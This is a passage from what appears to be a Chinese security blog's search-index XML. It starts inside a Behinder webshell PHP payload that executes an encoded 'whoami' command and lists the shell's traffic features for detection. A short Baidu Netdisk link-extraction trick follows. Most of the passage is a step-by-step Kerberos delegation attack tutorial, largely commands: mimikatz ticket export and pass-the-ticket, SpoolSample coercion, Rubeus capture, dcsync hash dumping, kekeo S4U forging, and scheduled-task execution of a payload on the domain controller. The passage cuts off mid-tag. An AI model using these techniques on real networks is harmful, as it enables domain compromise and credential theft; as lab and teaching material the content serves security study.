(is_resource($fp)) &#123;            while (! feof($fp)) &#123;                $kWJW .= fread($fp, 1024);            &#125;        &#125;        @pclose($fp);    &#125; else &#123;        $kWJW = 0;        $result["status"] = base64_encode("fail");        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");        $key = $_SESSION['k'];        echo encrypt(json_encode($result));        return;            &#125;    $result["status"] = base64_encode("success");    $result["msg"] = base64_encode(getSafeStr($kWJW));    echo encrypt(json_encode($result));&#125;function Encrypt($data)&#123;    $key="e45e329feb5d925b"; for($i=0;$i<strlen($data);$i++) &#123;    $data[$i] = $data[$i]^$key[$i+1&15];     &#125;    $bs="base64_"."encode";$after=$bs($data."");    return $after;&#125;$cmd="Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJndob2FtaQ==";$cmd=base64_decode($cmd);$path="QzovcGhwU3R1ZHkvV1dXLw==";$path=base64_decode($path);main($cmd,$path);</code></pre><p>总结特征如下：</p><ol><li>没有显示木马连接密码（默认连接密码为<code>rebeyond</code>，其md5值的前16位被作为AES密钥）</li><li>Accept值<code> application/json, text/javascript, */*; q=0.01</code>浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript</li><li>弱特征：Content-type: Application&#x2F;x-www-form-urlencoded</li><li>@error_reporting(0); 关闭了所有的错误报告</li><li>长连接：冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection</li><li>连接端口在49700左右每次连接就逐一叠加</li></ol>]]></content>
      
      
      <categories>
          
          <category> 蓝队应急 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】百度网盘小程序如何在网页中打开提取</title>
      <link href="/2024/03/06/Extracurricular-experience-MiniProgram-BaiduNetdisk/"/>
      <url>/2024/03/06/Extracurricular-experience-MiniProgram-BaiduNetdisk/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】百度网盘小程序如何在网页中打开提取"><a href="#【其他经验】百度网盘小程序如何在网页中打开提取" class="headerlink" title="【其他经验】百度网盘小程序如何在网页中打开提取"></a>【其他经验】百度网盘小程序如何在网页中打开提取</h1><h3 id="一、在网页中打开小程序百度网盘资源"><a href="#一、在网页中打开小程序百度网盘资源" class="headerlink" title="一、在网页中打开小程序百度网盘资源"></a>一、在网页中打开小程序百度网盘资源</h3><p>当好友发了一个小程序版的百度网盘资源，却只能在小程序的百度网盘中打开保存，无法保存至其他网盘。</p><p>我们可以利用【举报】—&gt;【版权投诉】机制获取该资源的链接</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306213816510.png" alt="image-20240306213816510"></p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214116811.png" alt="image-20240306214116811"></p><p>复制链接之后即可在网页中打开，但这个时候可能会需要提取码</p><h3 id="二、获取该资源的提取码"><a href="#二、获取该资源的提取码" class="headerlink" title="二、获取该资源的提取码"></a>二、获取该资源的提取码</h3><p>我们可以分享该资源到<strong>文件助手或自己的好友</strong>，再打开分享后的资源</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214348028.png" alt="image-20240306214348028"></p><p>点击上方的三个点，依然点击投诉</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214746035.png" alt="image-20240306214746035"></p><p>之后选择复制链接</p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306214832043.png" alt="image-20240306214832043"></p><p>再次发送到<strong>文件助手或好友</strong>，即可看到<code>&amp;pwd=提取码</code></p><p><img src="/img/Extracurricular-experience-MiniProgram-BaiduNetdisk/image-20240306215121625.png" alt="image-20240306215121625"></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 百度网盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网横向】内网渗透横向移动—委派攻击</title>
      <link href="/2024/03/06/Intranet-Penetration-Delegation-attack/"/>
      <url>/2024/03/06/Intranet-Penetration-Delegation-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="【内网横向】内网渗透横向移动：委派攻击"><a href="#【内网横向】内网渗透横向移动：委派攻击" class="headerlink" title="【内网横向】内网渗透横向移动：委派攻击"></a>【内网横向】内网渗透横向移动：委派攻击</h1><h1 id="一、委派介绍"><a href="#一、委派介绍" class="headerlink" title="一、委派介绍"></a>一、委派介绍</h1><h2 id="1、委派简介"><a href="#1、委派简介" class="headerlink" title="1、委派简介"></a>1、委派简介</h2><p>在内网身份认证的<code>Kerberos</code> 认证中，需要经过两次票据认证，分别是TGT 和ST 认证。那么此时有一种服务，我们可以委托中间商帮我们进行票据认证，而不必我们亲自前往认证，那么这种服务就是委派。</p><p>但如果设置了不正确的委派，可能会被恶意利用，加速内网的沦陷。</p><h2 id="2、委派的分类"><a href="#2、委派的分类" class="headerlink" title="2、委派的分类"></a>2、委派的分类</h2><ol><li><strong>非约束性委派：</strong>即没有服务访问限制的委派，委派了任何服务</li><li><strong>约束性委派：</strong>有服务访问限制，只能访问指定的服务</li><li><strong>基于资源的委派：</strong>在Windows Server 2012中引入，不需要域管理员权限就可以进行设置，可以将资源委派给受信任的账户。约束性委派不能跨域委派，而基于资源的约束性委派可以跨域和林</li></ol><h2 id="3、委派攻击的工作场景"><a href="#3、委派攻击的工作场景" class="headerlink" title="3、委派攻击的工作场景"></a>3、委派攻击的工作场景</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%9C%BA%E6%99%AF.png"></p><p>此时就是web系统被赋予了委派，用户A去访问web系统的时候，KDC将会把用户A 的TGT给web，web就可以拿着A的TGT去访问文件服务器。如果用户A是域管的话，将会有很多的权限。</p><h2 id="4、设置委派"><a href="#4、设置委派" class="headerlink" title="4、设置委派"></a>4、设置委派</h2><p>在域内只有主机账号和服务账号才有委派属性。</p><p>主机账号：活动目录中的computers组内的计算机，也被称为机器账号。（域委派只能给某个域机器或机器上的<strong>服务账号，域管</strong>也不能给。）<img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162305953.png" alt="image-20231121162305953"></p><p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p><p><strong>1、创建服务账号</strong></p><p>服务账号：如SQLServer、MYSQL等。创建服务账号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test123 Admin@123 /add /domain//创建一个普通用户</span><br><span class="line">setspn -U -A priv/test test123//注册为服务账号</span><br></pre></td></tr></table></figure><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162410467.png" alt="image-20231121162410467" style="zoom:150%;" /><p><strong>2、开启委派如图</strong></p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121162446733.png" alt="image-20231121162446733"></p><h1 id="二、非约束性委派攻击"><a href="#二、非约束性委派攻击" class="headerlink" title="二、非约束性委派攻击"></a>二、非约束性委派攻击</h1><h2 id="1、非约束性委派攻击利用原理"><a href="#1、非约束性委派攻击利用原理" class="headerlink" title="1、非约束性委派攻击利用原理"></a>1、非约束性委派攻击利用原理</h2><p>若某台主机被设置为了非约束委派时，当一个用户访问此主机时，会把自己的TGT发送给此主机，同时，此TGT会被保存在该主机内存（lsass.exe）中以便后续使用，如果我们可以诱导域控制器访问此主机，域控制器就会把它的TGT发送到此主机上，如果我们可以获取到与控制器的TGT就可以生成黄金票据。</p><p><strong>利用前提：</strong>我们此时控制了web机器，并且web机器被赋予了非约束性委派。此时只需要让域管这个账号访问web机器，web机器就能拿到域管的TGT，那么就可以制作黄金票据，进而就可以访问任何机器。</p><h2 id="1、查询非约束性委派机器和用户信息"><a href="#1、查询非约束性委派机器和用户信息" class="headerlink" title="1、查询非约束性委派机器和用户信息"></a>1、查询非约束性委派机器和用户信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//需要域用户权限，下面填写god.org就可以了。</span><br><span class="line">使用Adfind查询域内非约束委派机器账号：</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line">查询具有委派的服务账号：</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121171335033.png" alt="image-20231121171335033"><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121171358610.png" alt="image-20231121171358610"></p><h2 id="2、利用非约束性委派域控主动访问控制域"><a href="#2、利用非约束性委派域控主动访问控制域" class="headerlink" title="2、利用非约束性委派域控主动访问控制域"></a>2、利用非约束性委派域控主动访问控制域</h2><h3 id="1、实验环境："><a href="#1、实验环境：" class="headerlink" title="1、实验环境："></a>1、实验环境：</h3><p>一台域控DC、一台域内web机器。</p><p>实验前提：我们控制了web机器，且此web机器的配置了非约束性委派。</p><h3 id="2、实验步骤"><a href="#2、实验步骤" class="headerlink" title="2、实验步骤"></a>2、实验步骤</h3><ol><li><p>我们在web机器上先去访问域控，是不能访问的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li><li><p>在域控上主动访问web机器（在实战中是需要需要等待域管去访问我们控制的这台web机器，这样就拿到了域管的TGT）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\PC-WEB.HACK.COM /user:hack\administrator Admin@123</span><br><span class="line">//在域控上执行，使用域管的账号密码。来模拟域管访问web机器。</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20231121173326727.png" alt="image-20231121173326727"></p></li><li><p>回到web机器，导出票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></li><li><p>进行导入票据传递获取域控权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;54acdf]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>再次访问域控成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li><li><p>配合计划任务等上线DC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 123.exe \\dc.hack.com\C$</span><br><span class="line">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\123.exe /ru system /f</span><br><span class="line">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="3、利用非约束性委派域控被动访问控制域控"><a href="#3、利用非约束性委派域控被动访问控制域控" class="headerlink" title="3、利用非约束性委派域控被动访问控制域控"></a>3、利用非约束性委派域控被动访问控制域控</h2><h3 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h3><p>一台DC域控、一台OA域内机器，跟上述实验的web的性质是一样。</p><p>实验前提：控制了OA，且OA有非约束性委派。</p><h3 id="2、实验思路"><a href="#2、实验思路" class="headerlink" title="2、实验思路"></a>2、实验思路</h3><p>一般域管不会主动访问我们，我们可以利用windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启动的方法。域用户可以使用MS-RPRN方法强制任何运行了Spooler服务的计算机通过kerberos协议或者NTLM对攻击者选择的目标进行身份验证。</p><p>非约束性委派结合Spooler打印机服务漏洞，让域控机DC强制访问有非约束性委派的OA机器，从而拿到域管的TGT，进而控制域管。（2008可能复现不来，版本问题）</p><h3 id="3、实验步骤"><a href="#3、实验步骤" class="headerlink" title="3、实验步骤"></a>3、实验步骤</h3><ol><li><p>利用Rubeus在OA上以管理员权限执行以下命令，作用是每隔一秒监听来自域控机器DC的登陆信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line">//DC$是机器名</span><br></pre></td></tr></table></figure></li><li><p>再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC OA//强制让DC访问OA</span><br></pre></td></tr></table></figure></li><li><p>Rubeus监听到票据。<img src="/img/Intranet-Penetration-Delegation-attack/Rubeus%E7%9B%91%E5%90%AC%E5%BE%97%E5%88%B0%E7%9A%84%E7%A5%A8%E6%8D%AE.png"></p></li><li><p>Rubeus导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:票据内容</span><br><span class="line">//票据内容就是长长的一大坨的Beas64编码的内容</span><br><span class="line">//注意不能有空格，且该票并不是黄金白银票据，不能访问DC的文件</span><br></pre></td></tr></table></figure></li><li><p>利用该票据通过mimikatz获取与用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure></li><li><p>得到与用户的NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">krbtgt用户的NTLM可以制作黄金票据</span><br><span class="line">Administrator的NTLM可以进行hash传递的PTH攻击</span><br></pre></td></tr></table></figure></li><li><p>如果制作黄金票据，可以利用计划任务等上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy 123.exe \\dc.hack.com\C$</span><br><span class="line">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\123.exe /ru</span><br><span class="line">system /f</span><br><span class="line">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4、构造服务账户票据控制域控"><a href="#4、构造服务账户票据控制域控" class="headerlink" title="4、构造服务账户票据控制域控"></a>4、构造服务账户票据控制域控</h2><h3 id="1、实验前提"><a href="#1、实验前提" class="headerlink" title="1、实验前提"></a>1、实验前提</h3><ol><li><p>服务账户设置了非约束性委派</p></li><li><p>已知服务账户的密码口令信息</p></li></ol><h3 id="2、实验步骤-1"><a href="#2、实验步骤-1" class="headerlink" title="2、实验步骤"></a>2、实验步骤</h3><ol><li><p>使用 adfifind发现服务账号test设置了非约束委派</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%94%A8%E6%88%B7.png"></p></li><li><p>构造服务账户TGT的票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:test /domain:hack.com /password:Admin@123</span><br><span class="line">/ticket:test.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用刚才伪造的TGT票据，向域服务器申请CIFS服务票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_test@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</span><br><span class="line">/user:administrator@hack.com /service:cifs/DC.HACK.COM&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用mimikatz将该票据注入当前的会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge    #先清空票据</span><br><span class="line">mimikatz kerberos::ptt TGS_administrator@hack.com@HACK.COM_test@HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\c$</span><br></pre></td></tr></table></figure></li></ol><h1 id="三、约束性委派攻击"><a href="#三、约束性委派攻击" class="headerlink" title="三、约束性委派攻击"></a>三、约束性委派攻击</h1><h2 id="1、添加约束性委派"><a href="#1、添加约束性委派" class="headerlink" title="1、添加约束性委派"></a>1、添加约束性委派</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E6%B7%BB%E5%8A%A0%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE.png"></p><h2 id="2、查询约束性委派机器和用户信息"><a href="#2、查询约束性委派机器和用户信息" class="headerlink" title="2、查询约束性委派机器和用户信息"></a>2、查询约束性委派机器和用户信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//需要域用户权限</span><br><span class="line">查询约束委派机器账户：</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class="line">查询约束委派服务账户</span><br><span class="line">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%99%A8%E6%9F%A5%E8%AF%A2.png"></p><p>至此限制了我们只能打DC这一台机器，且只能访问cifs服务，不能访问其他服务，无法上传木马上线。</p><h2 id="2、实验场景"><a href="#2、实验场景" class="headerlink" title="2、实验场景"></a>2、实验场景</h2><p><img src="/img/Intranet-Penetration-Delegation-attack/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%AE%9E%E9%AA%8C%E5%9C%BA%E6%99%AF.png"></p><p>实验前提：我们已经控制了ZS的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的HASH值。</p><h2 id="3、实验步骤-1"><a href="#3、实验步骤-1" class="headerlink" title="3、实验步骤"></a>3、实验步骤</h2><ol start="2"><li><p>使用mimikatz获取本地机器账户有约束性委派权限的NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li><li><p>使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_PC-ZS$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</span><br><span class="line">/user:Administrator@hack.com /service:cifs/dc.hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></li><li><p>注入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge    #先清空票据</span><br><span class="line">mimikatz kerberos::ptt</span><br><span class="line">TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi</span><br></pre></td></tr></table></figure></li><li><p>访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.hack.com\C$</span><br><span class="line">//注意，此时只有CIFS文件共享服务票据，没有host服务票据票据。</span><br></pre></td></tr></table></figure></li></ol><h1 id="四、基于资源的约束性委派攻击"><a href="#四、基于资源的约束性委派攻击" class="headerlink" title="四、基于资源的约束性委派攻击"></a>四、基于资源的约束性委派攻击</h1><h2 id="一、基于资源的约束性委派介绍"><a href="#一、基于资源的约束性委派介绍" class="headerlink" title="一、基于资源的约束性委派介绍"></a>一、基于资源的约束性委派介绍</h2><p><strong>基于资源的约束性委派：</strong>为了使⽤户&#x2F;资源更加独⽴，微软在Windows Server 2012中引⼊了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置相关属性，⽽是将设置委派的权限交给了服务机器。服务机器在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性，就可以进行基于资源的约束委派。</p><p>2008 及以下的域控没有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性，只有 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器才有 msDS-AllowedToActOnBehalfOfOtherIdentity 这个属性</p><h2 id="二、攻击前提"><a href="#二、攻击前提" class="headerlink" title="二、攻击前提"></a>二、攻击前提</h2><ol><li>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限</li><li>可以创建机器账户（或已知机器账户）</li></ol><p>什么用户具备修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限呢？</p><ol><li>将该主机加入域的用户账户<br>账户中有一个<code>mSDS-CreatorSID</code>属性，用于标记加入域时使用的用户账户SID值，进一步就可以知道一些具有加入域权限的用户账户了！</li><li>Account Operator组成员</li><li>该主机的机器账户</li></ol><p>谁可以创建机器账户呢？</p><p>对于一般域成员，由<code>msDS-MachineAccountQuota</code>（可以在域控）属性决定，默认可以创建10个机器账户。</p><p>可以在域控中输入<code> adsiedit.msc</code>（ADSI编辑器）中右击-“连接到”-点击确定，右键 “DC&#x3D;xxx DC&#x3D;”com” 单击“属性”，<code>ms-DS-MachineAccountQuota</code>属性值为10，说明了一个普通的域用户可以将10台主机加入到域</p><h2 id="三、环境配置"><a href="#三、环境配置" class="headerlink" title="三、环境配置"></a>三、环境配置</h2><p>域：god.org</p><ul><li>域控：192.168.31.58（Windows server 2012）</li><li>stu1主机：192.168.31.52（win7域机器）</li></ul><p>1、新建一个普通域用户<code>test</code></p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163113791.png" alt="image-20240319163113791"></p><p>2、将之前加入域的win7退出域，修改计算机名，使用普通域用户<code>test</code>再加入域</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163700794.png" alt="image-20240319163700794"></p><p>重启计算机，成功加入域<code>god.org</code>，并使用test 域用户进入计算机</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319163808774.png" alt="image-20240319163808774"></p><h2 id="四、目标查询"><a href="#四、目标查询" class="headerlink" title="四、目标查询"></a>四、目标查询</h2><p>为了实验真实，直接用cs来操作</p><p>查看本地管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319164805983.png" alt="image-20240319164805983"></p><p>可以看到<code>test</code>用户不在本地管理员组中，<code>test</code>用户负责将<code>stu2</code>机器加入到域中，那么我们拿到这个<code>test</code>用户权限之后，就可以拿下域内<code>stu2</code>或其他被<code>test</code>用户加入到域内的机器</p><h3 id="1、核心目标查询（由机器找到对应的用户）"><a href="#1、核心目标查询（由机器找到对应的用户）" class="headerlink" title="1、核心目标查询（由机器找到对应的用户）"></a>1、核心目标查询（由机器找到对应的用户）</h3><p><strong>核心目标：找到可修改该机器msDS-AllowedToActOnBehalfOfOtherIdentity的用户</strong>，也就是查询机器是由哪个域用户添加进域的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//通过adfind.exe查找机器账户的mS-DS-CreatorSID属性</span><br><span class="line">AdFind.exe -h 192.168.10.2 -u yu -up yu.com -b &quot;DC=test,DC=lab&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class="line"></span><br><span class="line">//相关参数讲解：</span><br><span class="line">-h：接域控制器的IP</span><br><span class="line">-u：接用于初始绑定到域控制器的用户名</span><br><span class="line">-up：接用户的密码</span><br><span class="line">-b：接域的名称</span><br><span class="line">-f：接LDAP过滤条件，执行搜索的对象类别，在这里是computer，即所有计算机账户</span><br><span class="line">mS-DS-CreatorSID：是要检索创建计算机账户时所使用的用户安全标识符（SID）</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319170857449.png" alt="image-20240319170857449"></p><p>我们知道将机器加入到域的域用户SID值，却不知道对应的用户名</p><p>查询SID的方法有很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//1、查询当前用户的SID值</span><br><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line">//2、域用户可以利用wmic查询域内所有账户的SID值</span><br><span class="line">wmic useraccount get /all | findstr &lt;SID值&gt;</span><br><span class="line"></span><br><span class="line">//3、使用Powershell反查SID对应的用户</span><br><span class="line">powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier &lt;SID值&gt;;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319171959713.png" alt="image-20240319171959713"></p><p>可以看到，该SID值对应的正好是当前用户<code>test</code></p><h3 id="1、核心目标查询（由当前用户找到对应的机器）"><a href="#1、核心目标查询（由当前用户找到对应的机器）" class="headerlink" title="1、核心目标查询（由当前用户找到对应的机器）"></a>1、核心目标查询（由当前用户找到对应的机器）</h3><p><strong>核心目标：由已知用户查找到通过该用户加入域中的机器</strong>，需要使用<code>PowerView.ps1</code>工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查用户账户SID</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"># 使用PowerView查经由该用户加入域内的机器账户(主机)</span><br><span class="line"># 需要具备GeneriCall或WriteProperty等修改权限</span><br><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">powershell-import PowerView.ps1（不论报错）</span><br><span class="line">powerpick Get-DomainObjectAcl | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3309395417-4108617856-2168433834-1104&quot;&#125; | select objectdn,activedirectoryrights</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319210053534.png" alt="image-20240319210053534"></p><h2 id="五、攻击利用"><a href="#五、攻击利用" class="headerlink" title="五、攻击利用"></a>五、攻击利用</h2><h3 id="1、攻击方式1：修改委派属性拿下主机"><a href="#1、攻击方式1：修改委派属性拿下主机" class="headerlink" title="1、攻击方式1：修改委派属性拿下主机"></a>1、攻击方式1：修改委派属性拿下主机</h3><p><strong>关键：能修改那台服务资源的委派属性，就可以拿下该台主机</strong></p><p>利用条件：</p><ol><li>允许创建机器账户</li><li>具有管理主机加入域的用户账户</li></ol><h4 id="1、添加机器账户"><a href="#1、添加机器账户" class="headerlink" title="1、添加机器账户"></a>1、添加机器账户</h4><p><strong>方法一：利用powermad 添加机器账户</strong></p><p>用到<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a> 脚本，往域中添加一个机器账户<code>test1$</code></p><figure class="highlight 